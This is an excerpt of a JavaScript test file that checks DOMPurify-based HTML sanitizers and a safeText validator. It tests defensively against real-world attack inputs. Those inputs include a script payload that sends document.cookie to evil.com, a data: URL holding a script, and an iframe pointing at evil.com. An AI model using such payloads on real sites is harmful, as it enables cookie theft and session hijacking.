...
describe("sanitizers.html (DOMPurify)", () => {
  ...
  describe("Real-world attack scenarios", () => {
    ...
    it("should neutralize reflected XSS via comment", () => {
      const userComment =
        'Great post! <script>document.location="http://evil.com?c="+document.cookie</script>';
...
describe("validators.safeText (DOMPurify)", () => {
  ...
  describe("Unsafe text detection", () => {
    ...
    it("should reject data: protocol", () => {
      expect(
        validators.safeText("data:text/html,<script>alert(1)</script>"),
      ).toBe(false);
    });

    it("should reject iframe", () => {
      expect(validators.safeText('<iframe src="evil.com"></iframe>')).toBe(
        false,
      );
    });
